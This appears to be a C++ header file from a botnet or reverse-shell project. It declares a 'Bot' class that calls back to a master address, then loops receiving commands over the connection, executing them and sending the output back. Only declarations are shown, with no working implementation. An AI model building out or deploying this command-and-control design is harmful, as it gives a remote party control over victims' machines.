#include <TCPListener.hpp>
#include <netinet/in.h>
#include <thread>
#pragma once

class Bot {
  public:
    Bot(const sockaddr_in *cbaddr);
    ~Bot();
    
    int callback(); // Calls back to m_callback_addr
    void rce_loop(); // Starts on connection

  private:
    bool is_connected(); // Checks if a connection is active

    std::string get_command();                    // Gets command from connection
    std::string execute_command(std::string cmd); // Executes command
    int send_output(std::string output);          // Sends command output back through connection

    sockaddr_in m_callback_addr; // Callback/Master Address
    int m_rce;                   // Remote Code Executor Fd
    TCPListener m_tl;
};